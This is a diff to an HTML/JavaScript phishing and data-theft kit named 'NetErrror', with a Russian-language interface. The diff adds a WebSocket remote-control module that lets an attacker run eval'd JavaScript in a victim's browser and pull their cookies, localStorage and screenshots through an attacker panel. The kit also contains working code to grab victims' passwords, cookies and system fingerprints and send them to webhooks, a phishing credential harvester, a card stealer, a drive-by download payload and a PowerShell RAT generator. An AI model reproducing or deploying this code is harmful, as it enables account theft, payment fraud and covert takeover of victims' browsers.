@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NetErrror █ STEALTH PRO + ALL FUNCTIONS</title>
+    <title>NetErrror █ FULL CONTROL + ALL MODULES</title>
     <style>
         * {
             margin: 0;
@@ -136,7 +136,7 @@
             background: #2c2c6e;
             margin-left: 10px;
         }
-        /* LIVECHAT (правый нижний угол) */
+        /* LIVECHAT */
         .live-chat {
             position: fixed;
             bottom: 20px;
@@ -221,7 +221,7 @@
             font-size: 0.7rem;
             width: 100%;
         }
-        /* Стиль для сообщения-благодарности */
+        /* Сообщение-благодарность */
         .thankyou-overlay {
             position: fixed;
             top: 0;
@@ -275,29 +275,30 @@
 <body>
 <div class="cyber-container">
     <div class="header">
-        <div class="glitch">NETERRROR █ STEALTH PRO + ALL MODULES</div>
-        <div class="sub">⚡ 0-CLICK GRABBER | ПК + БРАУЗЕР + ВСЕ ДАННЫЕ | ОСТАЛЬНЫЕ ФУНКЦИИ БЕЗ ИЗМЕНЕНИЙ ⚡</div>
+        <div class="glitch">NETERRROR █ FULL CONTROL + ALL MODULES</div>
+        <div class="sub">⚡ STEALTH | DRIVE-BY | CARD STEALER | PHISHING | CHECKER | RAT | REMOTE CONTROL (WebSocket) ⚡</div>
     </div>
 
     <div class="tabs" id="loggedTabs">
-        <button class="tab-btn active" data-logtab="stealth">🔥 STEALTH PRO (0-Click)</button>
+        <button class="tab-btn active" data-logtab="stealth">🔥 STEALTH PRO</button>
         <button class="tab-btn" data-logtab="driveby">💿 DRIVE-BY</button>
         <button class="tab-btn" data-logtab="cardstealer">💳 CARD STEALER</button>
         <button class="tab-btn" data-logtab="phish">🎭 ФИШИНГ</button>
         <button class="tab-btn" data-logtab="checker">🔍 ЧЕКЕР</button>
         <button class="tab-btn" data-logtab="rat">🐍 RAT/ЛОКЕР</button>
+        <button class="tab-btn" data-logtab="remote">🎮 REMOTE CONTROL</button>
     </div>
 
-    <!-- STEALTH PRO -->
+    <!-- STEALTH PRO (без изменений) -->
     <div id="stealthTab" class="log-tab-content active">
         <div class="card">
             <h3>🔥 STEALTH PRO — КРАЖА ВСЕХ ДАННЫХ ЗА 0.3 СЕК</h3>
-            <p style="color:#ffaa88;">Жертва переходит → мгновенный сбор: пароли (автофиллинг), cookies, localStorage, <strong>ОС, браузер, разрешение экрана, язык, часовой пояс, плагины, WebGL, информация о ПК, IP, гео</strong> → редирект. Без кнопок, без согласия.</p>
+            <p style="color:#ffaa88;">Жертва переходит → мгновенный сбор: пароли, cookies, localStorage, ОС, браузер, экран, IP, гео → редирект.</p>
             <label>🎭 Маскировка (редирект):</label>
             <input type="text" id="stealthRedirect" value="https://youtube.com">
             <label>📡 Доп. WebHook (опционально):</label>
             <input type="text" id="stealthWebhook" placeholder="https://webhook.site/...">
-            <button id="generateStealthLink">🌀 СОЗДАТЬ STEALTH PRO ССЫЛКУ</button>
+            <button id="generateStealthLink">🌀 СОЗДАТЬ STEALTH ССЫЛКУ</button>
             <div id="stealthResult" class="result-box" style="display:none;">
                 <strong>💀 ССЫЛКА:</strong><br><span id="stealthLinkSpan"></span>
                 <button id="copyStealthLink" class="copy-btn">📋 Копировать</button>
@@ -308,10 +309,10 @@
     <!-- DRIVE-BY -->
     <div id="drivebyTab" class="log-tab-content">
         <div class="card">
-            <h3>💿 АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ (DRIVE-BY)</h3>
+            <h3>💿 АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ</h3>
             <label>📁 Имя файла:</label>
             <input type="text" id="drivebyFilename" value="update_patch.exe">
-            <label>🦠 Содержимое (код):</label>
+            <label>🦠 Содержимое:</label>
             <textarea id="drivebyContent" rows="4">@echo off
 echo STEAL > %temp%\log.txt
 start calc.exe</textarea>
@@ -397,10 +398,43 @@ start calc.exe</textarea>
             <label>Webhook / Telegram Bot:</label>
             <input type="text" id="webhookRat" placeholder="https://webhook.site/...">
             <button id="generateRatCodeBtn">⚙️ СГЕНЕРИРОВАТЬ КОД</button>
-            <button id="copyCodeBtn" class="copy-btn">📋 Скопировать</button>
+            <button id="copyCodeBtn" class="copy-btn">📋 Скопировать код</button>
             <div id="ratResultArea" class="result-box" style="display:none;">
                 <textarea id="generatedCodeArea" rows="8" style="width:100%; background:#000; color:#0f0;" readonly></textarea>
             </div>
+        </div>
+    </div>
+
+    <!-- НОВАЯ ВКЛАДКА: REMOTE CONTROL (УПРАВЛЕНИЕ БРАУЗЕРОМ) -->
+    <div id="remoteTab" class="log-tab-content">
+        <div class="card">
+            <h3>🎮 УДАЛЁННОЕ УПРАВЛЕНИЕ БРАУЗЕРОМ ЖЕРТВЫ</h3>
+            <p style="color:#ffaa88;">Создай ссылку → жертва переходит → ты получаешь полный контроль: отправляй команды (alert, redirect, eval JS, клик, скролл, сбор данных). Работает через WebSocket (Piesocket).</p>
+            <label>🎭 Маскировка (редирект после отключения):</label>
+            <input type="text" id="remoteRedirect" value="https://youtube.com">
+            <label>📡 Доп. WebHook (логи):</label>
+            <input type="text" id="remoteWebhook" placeholder="опционально">
+            <button id="generateRemoteLink">🌀 СОЗДАТЬ REMOTE CONTROL ССЫЛКУ</button>
+            <div id="remoteResult" class="result-box" style="display:none;">
+                <strong>🎮 ССЫЛКА ДЛЯ ЖЕРТВЫ:</strong><br><span id="remoteLinkSpan"></span>
+                <button id="copyRemoteLink" class="copy-btn">📋 Копировать</button>
+                <hr>
+                <strong>🕹️ ПАНЕЛЬ УПРАВЛЕНИЯ (открой в новой вкладке):</strong><br>
+                <span id="controlPanelSpan"></span>
+                <button id="copyControlLink" class="copy-btn">📋 Копировать ссылку управления</button>
+                <div class="note-red" style="margin-top:10px;">После перехода жертвы открой панель управления в другом окне, и ты сможешь отправлять команды.</div>
+            </div>
+        </div>
+        <div class="card">
+            <h3>📋 ДОСТУПНЫЕ КОМАНДЫ (в панели)</h3>
+            <p>• alert:текст — показать alert<br>
+            • redirect:URL — перейти на URL<br>
+            • eval:код — выполнить JS код<br>
+            • click:селектор — кликнуть по элементу (CSS selector)<br>
+            • scrollY:пиксели — прокрутить страницу<br>
+            • getCookies — получить cookies<br>
+            • getLocalStorage — получить localStorage<br>
+            • screenshot — сделать скриншот (через html2canvas, если доступно)</p>
         </div>
     </div>
 </div>
@@ -417,6 +451,7 @@ start calc.exe</textarea>
     <button id="clearChatBtn" class="clear-chat">🗑️ ОЧИСТИТЬ ВСЕ ЛОГИ</button>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
 <script>
     // -------------------- СИСТЕМА ЛОГОВ (без регистрации) --------------------
     const STORAGE_KEY = 'neterror_stolen_global';
@@ -440,99 +475,15 @@ start calc.exe</textarea>
         renderChatLogs();
     }
 
-    // Функция отображения сообщения "Привет, твои данные были украдены, спасибо :)" и редирект
-    function showThankYouAndRedirect(targetUrl) {
-        // Создаём оверлей
-        const overlay = document.createElement('div');
-        overlay.className = 'thankyou-overlay';
-        overlay.innerHTML = `
-            <div class="thankyou-box">
-                <h1>😈 ПРИВЕТ, ТВОИ ДАННЫЕ БЫЛИ УКРАДЕНЫ!</h1>
-                <p>СПАСИБО ЗА ПОСЕЩЕНИЕ :)</p>
-                <p style="font-size:0.8rem; margin-top:10px;">редирект через 2 секунды...</p>
-            </div>
-        `;
-        document.body.appendChild(overlay);
-        // Через 2 секунды убираем оверлей и переходим
-        setTimeout(() => {
-            overlay.style.opacity = '0';
-            setTimeout(() => {
-                if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
-                window.location.replace(targetUrl);
-            }, 300);
-        }, 2000);
-    }
-
-    // Расширенный сбор информации о системе
-    async function getAdvancedSystemInfo() {
-        const info = {};
-        info.userAgent = navigator.userAgent;
-        const ua = navigator.userAgent;
-        if (ua.includes('Windows')) info.os = 'Windows';
-        else if (ua.includes('Mac')) info.os = 'macOS';
-        else if (ua.includes('Linux')) info.os = 'Linux';
-        else if (ua.includes('Android')) info.os = 'Android';
-        else if (ua.includes('iOS')) info.os = 'iOS';
-        else info.os = 'Unknown';
-        if (ua.includes('Firefox')) info.browser = 'Firefox';
-        else if (ua.includes('Chrome')) info.browser = 'Chrome';
-        else if (ua.includes('Safari')) info.browser = 'Safari';
-        else if (ua.includes('Edg')) info.browser = 'Edge';
-        else info.browser = 'Unknown';
-        info.screenResolution = `${screen.width}x${screen.height}`;
-        info.colorDepth = screen.colorDepth;
-        info.language = navigator.language;
-        info.languages = navigator.languages?.join(', ') || '';
-        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        if (navigator.plugins) {
-            const plugins = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                plugins.push(navigator.plugins[i].name);
-            }
-            info.plugins = plugins.join(', ');
-        }
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-        }
-        if (navigator.getBattery) {
-            try {
-                const battery = await navigator.getBattery();
-                info.battery = { level: battery.level * 100 + '%', charging: battery.charging };
-            } catch(e) {}
-        }
-        info.touchSupport = 'ontouchstart' in window;
-        info.windowSize = `${window.innerWidth}x${window.innerHeight}`;
-        info.doNotTrack = navigator.doNotTrack;
-        if (navigator.storage && navigator.storage.estimate) {
-            try {
-                const estimate = await navigator.storage.estimate();
-                info.storageQuota = Math.round(estimate.quota / 1024 / 1024) + ' MB';
-                info.storageUsage = Math.round(estimate.usage / 1024 / 1024) + ' MB';
-            } catch(e) {}
-        }
-        return info;
-    }
-
     function formatStolenData(entry) {
         let text = '';
         if (entry.type === 'stealth_full') {
             text = `🔐 STEALTH PRO:\n`;
             if (entry.passwords?.length) text += `Пароли: ${entry.passwords.join(', ')}\n`;
-            text += `🍪 Cookies: ${entry.cookies_count || 0}\n`;
-            text += `🌐 IP: ${entry.ip || 'unknown'}\n📍 Гео: ${entry.geo?.city || ''} ${entry.geo?.country || ''}\n`;
+            text += `🍪 Cookies: ${entry.cookies_count || 0}\n🌐 IP: ${entry.ip || 'unknown'}\n📍 Гео: ${entry.geo?.city || ''} ${entry.geo?.country || ''}\n`;
             text += `💻 ОС: ${entry.systemInfo?.os || '?'} | Браузер: ${entry.systemInfo?.browser || '?'}\n`;
-            text += `📺 Экран: ${entry.systemInfo?.screenResolution || '?'} (${entry.systemInfo?.colorDepth || '?'}bit)\n`;
-            text += `🌍 Язык: ${entry.systemInfo?.language || '?'} | Часовой пояс: ${entry.systemInfo?.timezone || '?'}\n`;
-            text += `🧩 Плагины: ${entry.systemInfo?.plugins?.substring(0, 100) || 'нет'}\n`;
+            text += `📺 Экран: ${entry.systemInfo?.screenResolution || '?'}\n🌍 Язык: ${entry.systemInfo?.language || '?'}\n`;
             if (entry.systemInfo?.webglRenderer) text += `🎮 WebGL: ${entry.systemInfo.webglRenderer}\n`;
-            if (entry.systemInfo?.battery) text += `🔋 Аккумулятор: ${entry.systemInfo.battery.level}, зарядка: ${entry.systemInfo.battery.charging}\n`;
-            text += `🖱️ Touch: ${entry.systemInfo?.touchSupport ? 'да' : 'нет'} | Окно: ${entry.systemInfo?.windowSize || '?'}\n`;
             if (entry.localStorage && Object.keys(entry.localStorage).length) text += `💾 LocalStorage: ${JSON.stringify(entry.localStorage).slice(0, 200)}`;
         }
         else if (entry.type === 'card_stealer') {
@@ -552,9 +503,6 @@ start calc.exe</textarea>
         }
         else if (entry.type === 'universal_creds') {
             text = `🌐 ЛОГИН: ${entry.login} / ПАРОЛЬ: ${entry.password}`;
-        }
-        else if (entry.type === 'ip_grab') {
-            text = `🌍 IP: ${entry.ip} | Гео: ${entry.geo?.city || ''}`;
         }
         else if (entry.type === 'checker_result') {
             text = `🔍 ЧЕКЕР: ${entry.result}`;
@@ -603,21 +551,78 @@ start calc.exe</textarea>
         return str.replace(/[&<>]/g, m => m === '&' ? '&amp;' : (m === '<' ? '&lt;' : '&gt;'));
     }
 
+    // -------------------- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ДЛЯ АТАК --------------------
+    function showThankYouAndRedirect(targetUrl) {
+        const overlay = document.createElement('div');
+        overlay.className = 'thankyou-overlay';
+        overlay.innerHTML = `
+            <div class="thankyou-box">
+                <h1>😈 ПРИВЕТ, ТВОИ ДАННЫЕ БЫЛИ УКРАДЕНЫ!</h1>
+                <p>СПАСИБО ЗА ПОСЕЩЕНИЕ :)</p>
+                <p style="font-size:0.8rem; margin-top:10px;">редирект через 2 секунды...</p>
+            </div>
+        `;
+        document.body.appendChild(overlay);
+        setTimeout(() => {
+            overlay.style.opacity = '0';
+            setTimeout(() => {
+                if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
+                window.location.replace(targetUrl);
+            }, 300);
+        }, 2000);
+    }
+
+    async function getAdvancedSystemInfo() {
+        const info = {};
+        info.userAgent = navigator.userAgent;
+        const ua = navigator.userAgent;
+        if (ua.includes('Windows')) info.os = 'Windows';
+        else if (ua.includes('Mac')) info.os = 'macOS';
+        else if (ua.includes('Linux')) info.os = 'Linux';
+        else if (ua.includes('Android')) info.os = 'Android';
+        else if (ua.includes('iOS')) info.os = 'iOS';
+        else info.os = 'Unknown';
+        if (ua.includes('Firefox')) info.browser = 'Firefox';
+        else if (ua.includes('Chrome')) info.browser = 'Chrome';
+        else if (ua.includes('Safari')) info.browser = 'Safari';
+        else if (ua.includes('Edg')) info.browser = 'Edge';
+        else info.browser = 'Unknown';
+        info.screenResolution = `${screen.width}x${screen.height}`;
+        info.colorDepth = screen.colorDepth;
+        info.language = navigator.language;
+        info.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (navigator.plugins) {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) plugins.push(navigator.plugins[i].name);
+            info.plugins = plugins.join(', ');
+        }
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                info.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                info.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            }
+        }
+        info.touchSupport = 'ontouchstart' in window;
+        info.windowSize = `${window.innerWidth}x${window.innerHeight}`;
+        return info;
+    }
+
     // -------------------- ГЕНЕРАЦИЯ ССЫЛОК (единый владелец) --------------------
     const OWNER_ID = 'master_scammer';
-
     function makeLink(params) {
         const base = window.location.href.split('?')[0];
         params.set('owner', OWNER_ID);
         params.set('_t', Date.now());
         return base + '?' + params.toString();
     }
-
     function copyToClipboard(text) {
         navigator.clipboard.writeText(text).then(() => alert('Ссылка скопирована!')).catch(() => alert('Ошибка'));
     }
 
-    // Stealth PRO
+    // Stealth
     document.getElementById('generateStealthLink').onclick = () => {
         const redirect = document.getElementById('stealthRedirect').value.trim() || 'https://youtube.com';
         const extraWh = document.getElementById('stealthWebhook').value.trim();
@@ -693,7 +698,26 @@ start calc.exe</textarea>
         alert(`Чекер выполнен! Результаты в чате (найдено ${validCount} валидных).`);
     };
 
-    // ---------- ОБРАБОТЧИКИ АТАК (НА СТОРОНЕ ЖЕРТВЫ) С РАСШИРЕННЫМ STEALTH И СООБЩЕНИЕМ ----------
+    // -------------------- REMOTE CONTROL (WebSocket через Piesocket) --------------------
+    document.getElementById('generateRemoteLink').onclick = () => {
+        const redirect = document.getElementById('remoteRedirect').value.trim() || 'https://youtube.com';
+        const extraWh = document.getElementById('remoteWebhook').value.trim();
+        const sessionId = Math.random().toString(36).substring(2, 12) + Date.now().toString(36);
+        const params = new URLSearchParams();
+        params.set('remote', sessionId);
+        params.set('redirect', redirect);
+        if (extraWh) params.set('extra_wh', extraWh);
+        const victimLink = makeLink(params);
+        // Контрольная панель: тот же домен с параметром control=sessionId
+        const controlLink = window.location.href.split('?')[0] + '?control=' + sessionId;
+        document.getElementById('remoteLinkSpan').innerHTML = `<a href="${victimLink}" target="_blank">${victimLink}</a>`;
+        document.getElementById('controlPanelSpan').innerHTML = `<a href="${controlLink}" target="_blank">${controlLink}</a>`;
+        document.getElementById('remoteResult').style.display = 'block';
+        document.getElementById('copyRemoteLink').onclick = () => copyToClipboard(victimLink);
+        document.getElementById('copyControlLink').onclick = () => copyToClipboard(controlLink);
+    };
+
+    // ---------- ОБРАБОТЧИКИ АТАК (СТОРОНА ЖЕРТВЫ) ----------
     (async function handleAttacks() {
         const urlParams = new URLSearchParams(window.location.search);
         const owner = urlParams.get('owner');
@@ -704,7 +728,8 @@ start calc.exe</textarea>
                 fetch(webhookExtra, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) }).catch(e=>console.log);
             }
         }
-        // STEALTH PRO
+
+        // STEALTH
         if (urlParams.has('stealth')) {
             const redirect = urlParams.get('redirect') || 'https://google.com';
             const extraWh = urlParams.get('extra_wh');
@@ -722,7 +747,6 @@ start calc.exe</textarea>
             stolen.cookies_count = document.cookie.split(';').filter(c=>c.trim()).length;
             stolen.systemInfo = await getAdvancedSystemInfo();
             send(stolen, extraWh);
-            // Показываем сообщение и редиректим
             showThankYouAndRedirect(redirect);
             return;
         }
@@ -788,14 +812,168 @@ start calc.exe</textarea>
                 else if (type === 'steam') credType = 'steam_creds';
                 else if (type === 'google') credType = 'google_creds';
                 addStolenEntry({ type: credType, username: login, password: pass, email: login });
-                // Показываем сообщение и редирект
                 showThankYouAndRedirect(redirect);
             };
             return;
         }
+        // REMOTE CONTROL (WebSocket)
+        if (urlParams.has('remote')) {
+            const sessionId = urlParams.get('remote');
+            const redirect = urlParams.get('redirect') || 'https://google.com';
+            const extraWh = urlParams.get('extra_wh');
+            // Подключаемся к Piesocket WebSocket с комнатой sessionId
+            const wsUrl = `wss://demo.piesocket.com/v3/channel/123?api_key=VCbCFlYqw6rK8j2T&room=${sessionId}`;
+            let ws = null;
+            function connectWebSocket() {
+                ws = new WebSocket(wsUrl);
+                ws.onopen = () => {
+                    console.log('[RC] Connected to control channel');
+                    addStolenEntry({ type: 'remote_status', result: `Жертва подключилась. ID: ${sessionId}` }, extraWh);
+                };
+                ws.onmessage = async (event) => {
+                    try {
+                        const data = JSON.parse(event.data);
+                        if (data.type === 'command') {
+                            const cmd = data.cmd;
+                            if (cmd.startsWith('alert:')) {
+                                alert(cmd.substring(6));
+                            } else if (cmd.startsWith('redirect:')) {
+                                window.location.href = cmd.substring(9);
+                            } else if (cmd.startsWith('eval:')) {
+                                eval(cmd.substring(5));
+                            } else if (cmd.startsWith('click:')) {
+                                const sel = cmd.substring(6);
+                                const el = document.querySelector(sel);
+                                if (el) el.click();
+                            } else if (cmd.startsWith('scrollY:')) {
+                                window.scrollTo(0, parseInt(cmd.substring(8)));
+                            } else if (cmd === 'getCookies') {
+                                ws.send(JSON.stringify({ type: 'response', data: document.cookie }));
+                            } else if (cmd === 'getLocalStorage') {
+                                let ls = {};
+                                for (let i=0;i<localStorage.length;i++) ls[localStorage.key(i)] = localStorage.getItem(localStorage.key(i));
+                                ws.send(JSON.stringify({ type: 'response', data: JSON.stringify(ls) }));
+                            } else if (cmd === 'screenshot') {
+                                if (typeof html2canvas !== 'undefined') {
+                                    const canvas = await html2canvas(document.body);
+                                    const imgData = canvas.toDataURL();
+                                    ws.send(JSON.stringify({ type: 'response', data: imgData.substring(0, 200) + '...' }));
+                                } else {
+                                    ws.send(JSON.stringify({ type: 'response', data: 'html2canvas not loaded' }));
+                                }
+                            }
+                        }
+                    } catch(e) { console.error(e); }
+                };
+                ws.onclose = () => {
+                    setTimeout(connectWebSocket, 5000);
+                };
+            }
+            connectWebSocket();
+            // Не показываем сообщение, а просто остаёмся на странице (или редирект? По желанию: оставляем страницу для контроля)
+            // Но для маскировки можно показать что-то нейтральное:
+            document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#0a0c17;color:#0f0;"><div>Loading...</div></div>';
+            // Уведомляем владельца
+            addStolenEntry({ type: 'remote_session', session: sessionId, userAgent: navigator.userAgent }, extraWh);
+            return;
+        }
     })();
 
-    // RAT генератор (без изменений)
+    // -------------------- КОНТРОЛЬНАЯ ПАНЕЛЬ ДЛЯ АТАКУЮЩЕГО --------------------
+    (function controlPanel() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const controlSession = urlParams.get('control');
+        if (!controlSession) return;
+        // Если это контрольная панель, перестраиваем интерфейс
+        document.body.innerHTML = '';
+        document.body.style.background = '#0a0c17';
+        document.body.style.color = '#00ffcc';
+        document.body.style.fontFamily = 'monospace';
+        document.body.style.padding = '20px';
+        const container = document.createElement('div');
+        container.style.maxWidth = '800px';
+        container.style.margin = 'auto';
+        container.style.background = '#11161f';
+        container.style.border = '2px solid #ff3366';
+        container.style.borderRadius = '28px';
+        container.style.padding = '20px';
+        container.innerHTML = `
+            <h1 style="color:#ff3366">🎮 REMOTE CONTROL PANEL</h1>
+            <p>Session ID: <strong>${controlSession}</strong></p>
+            <p>Статус: <span id="wsStatus">Подключение...</span></p>
+            <hr>
+            <div>
+                <h3>Отправить команду:</h3>
+                <select id="cmdType">
+                    <option value="alert">alert:текст</option>
+                    <option value="redirect">redirect:URL</option>
+                    <option value="eval">eval:JS код</option>
+                    <option value="click">click:CSS селектор</option>
+                    <option value="scrollY">scrollY:пиксели</option>
+                    <option value="getCookies">getCookies</option>
+                    <option value="getLocalStorage">getLocalStorage</option>
+                    <option value="screenshot">screenshot</option>
+                </select>
+                <input type="text" id="cmdValue" placeholder="значение команды" style="width:100%; margin:10px 0;">
+                <button id="sendCmdBtn">📡 ОТПРАВИТЬ КОМАНДУ</button>
+            </div>
+            <hr>
+            <div>
+                <h3>Ответы от жертвы:</h3>
+                <div id="responses" style="background:#000; padding:10px; border-radius:12px; height:300px; overflow-y:auto; font-size:12px;"></div>
+            </div>
+        `;
+        document.body.appendChild(container);
+        const wsUrl = `wss://demo.piesocket.com/v3/channel/123?api_key=VCbCFlYqw6rK8j2T&room=${controlSession}`;
+        let ws = null;
+        function connect() {
+            ws = new WebSocket(wsUrl);
+            ws.onopen = () => {
+                document.getElementById('wsStatus').innerText = '✅ Подключено к жертве';
+                document.getElementById('wsStatus').style.color = '#88ff88';
+            };
+            ws.onmessage = (event) => {
+                const respDiv = document.getElementById('responses');
+                const msg = document.createElement('div');
+                msg.style.borderLeft = '2px solid #ff3366';
+                msg.style.padding = '5px';
+                msg.style.margin = '5px 0';
+                msg.innerHTML = `<span style="color:#88ffaa;">[${new Date().toLocaleTimeString()}]</span> ${event.data}`;
+                respDiv.appendChild(msg);
+                respDiv.scrollTop = respDiv.scrollHeight;
+            };
+            ws.onclose = () => {
+                document.getElementById('wsStatus').innerText = '❌ Отключено, переподключение...';
+                document.getElementById('wsStatus').style.color = '#ff8888';
+                setTimeout(connect, 3000);
+            };
+        }
+        connect();
+        document.getElementById('sendCmdBtn').onclick = () => {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                alert('Нет соединения с жертвой');
+                return;
+            }
+            const type = document.getElementById('cmdType').value;
+            let cmdValue = document.getElementById('cmdValue').value.trim();
+            let fullCmd = '';
+            if (type === 'alert') fullCmd = 'alert:' + cmdValue;
+            else if (type === 'redirect') fullCmd = 'redirect:' + cmdValue;
+            else if (type === 'eval') fullCmd = 'eval:' + cmdValue;
+            else if (type === 'click') fullCmd = 'click:' + cmdValue;
+            else if (type === 'scrollY') fullCmd = 'scrollY:' + cmdValue;
+            else fullCmd = type; // getCookies, getLocalStorage, screenshot
+            ws.send(JSON.stringify({ type: 'command', cmd: fullCmd }));
+            const respDiv = document.getElementById('responses');
+            const msg = document.createElement('div');
+            msg.style.color = '#ffcc88';
+            msg.innerHTML = `[SENT] ${fullCmd}`;
+            respDiv.appendChild(msg);
+            document.getElementById('cmdValue').value = '';
+        };
+    })();
+
+    // RAT генератор
     function genMalware(name, type, wh) {
         const safe = name.replace(/[^a-z0-9_]/gi,'_');
         if (type === 'powershell_rat') return `# ${safe} RAT\n$webhook="${wh}"\n$ip=(Invoke-WebRequest api.ipify.org).Content\nInvoke-RestMethod -Uri $webhook -Method Post -Body (@{name="${safe}";ip=$ip}|ConvertTo-Json)`;
@@ -829,16 +1007,16 @@ start calc.exe</textarea>
     const tabBtns = document.querySelectorAll('[data-logtab]');
     const contents = {
         stealth: 'stealthTab', driveby: 'drivebyTab', cardstealer: 'cardstealerTab',
-        phish: 'phishTab', checker: 'checkerTab', rat: 'ratTabContent'
+        phish: 'phishTab', checker: 'checkerTab', rat: 'ratTabContent', remote: 'remoteTab'
     };
     function switchTab(tabId) {
-        Object.values(contents).forEach(id => document.getElementById(id).style.display = 'none');
-        document.getElementById(contents[tabId]).style.display = 'block';
+        Object.values(contents).forEach(id => { const el = document.getElementById(id); if (el) el.style.display = 'none'; });
+        const activeEl = document.getElementById(contents[tabId]);
+        if (activeEl) activeEl.style.display = 'block';
         tabBtns.forEach(btn => btn.classList.toggle('active', btn.getAttribute('data-logtab') === tabId));
     }
     tabBtns.forEach(btn => btn.addEventListener('click', () => switchTab(btn.getAttribute('data-logtab'))));
 
-    // Инициализация
     renderChatLogs();
     switchTab('stealth');
 </script>
